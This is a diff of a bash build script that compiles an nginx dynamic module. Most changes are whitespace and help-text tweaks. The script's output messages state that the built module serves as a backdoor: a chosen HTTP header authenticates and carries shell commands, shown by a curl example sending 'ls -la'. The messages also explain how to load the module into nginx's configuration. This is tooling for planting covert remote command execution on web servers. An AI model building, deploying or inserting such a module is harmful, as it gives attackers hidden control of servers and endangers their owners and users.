@@ -1,12 +1,12 @@
 #!/bin/bash
 
 function usage() {
-    printf "%s\n" \
-        "usage: $(basename $0) [-l] [-r -n]" \
-        "" \
-        "-l     list nginx releases" \
-        "-r     choose release" \
-        "-n     set name for the built nginx module" \
+    printf "%s\n"                                       \
+        "usage: $(basename $0) [-l] [-r -n]"            \
+        ""                                              \
+        "-l     list nginx releases"                    \
+        "-r     set nginx release"                      \
+        "-n     set name for the built nginx module"    \
         "-h     print this help message and exit"
         
     exit 1
@@ -60,6 +60,7 @@ if test -n "${release}"; then
 
     (
         cd "${dir_name}/nginx-${version}"
+
         if test -f configure; then
             if ./configure --add-dynamic-module=/root/ngx_mod_template/ --with-compat 2>&1 >$logfile; then
                 printf "%s\n" "[inf] configure successful"
@@ -73,6 +74,7 @@ if test -n "${release}"; then
             printf "%s\n" "[err] \"configure\" not found"
             exit 1
         fi
+
         if make modules CFLAGS="-Wno-unused-result" 2>&1 >$logfile; then
             printf "%s\n" "[inf] successfully built ${name}.so"
         else
@@ -85,12 +87,12 @@ if test -n "${release}"; then
 
     if test -f "${dir_name}/nginx-${version}/objs/${name}.so"; then
         cp "${dir_name}/nginx-${version}/objs/${name}.so" "${dir_name}/${name}_v${version}_${header}.so"
-        printf "%s\n" \
-            "" \
-            "[inf] output module \"${dir_name}/${name}_v${version}_${header}.so\"" \
-            "[inf] use \"${header}\" for backdoor authentication + command execution" \
-            "[inf] example: curl http://localhost -H '${header}: ls -la'" \
-            "[inf] enable with nginx module config in /etc/nginx/modules-enabled and \"load_module /path/to/${name}.so;\"" \
+        printf "%s\n"                                                                                                       \
+            ""                                                                                                              \
+            "[inf] output module \"${dir_name}/${name}_v${version}_${header}.so\""                                          \
+            "[inf] use \"${header}\" for backdoor authentication + command execution"                                       \
+            "[inf] example: curl http://localhost -H '${header}: ls -la'"                                                   \
+            "[inf] enable with nginx module config in /etc/nginx/modules-enabled and \"load_module /path/to/${name}.so;\""  \
             "[inf] enable with the main nginx config in /etc/nginx/nginx.conf and \"load_module /path/to/${name}.so;\""
     else
         printf "%s\n" "[err] module not found at \"${dir_name}/nginx-*/objs/${name}.so\", this should not happen"
